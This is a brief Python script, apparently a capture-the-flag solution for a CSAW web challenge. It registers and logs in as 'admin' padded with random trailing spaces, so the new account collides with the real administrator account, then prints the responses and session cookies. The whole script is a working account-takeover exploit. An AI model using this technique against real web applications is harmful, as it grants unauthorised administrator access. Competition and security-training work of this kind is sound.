#!/usr/bin/env python3

import requests
import random

url = 'http://web.red.csaw.io:5002/'

s = requests.Session()

x = random.randint(10,30)
creds = {'username':'admin'+' '*x,'password':'px'}

rsp = s.post(url+'register', data=creds)

print(rsp.text)

rsp = s.post(url+'login', data=creds)

print(rsp)
print(rsp.text)

rsp = s.get(url)
print(rsp)
print(rsp.cookies)

print(rsp.text)

print(s.cookies)


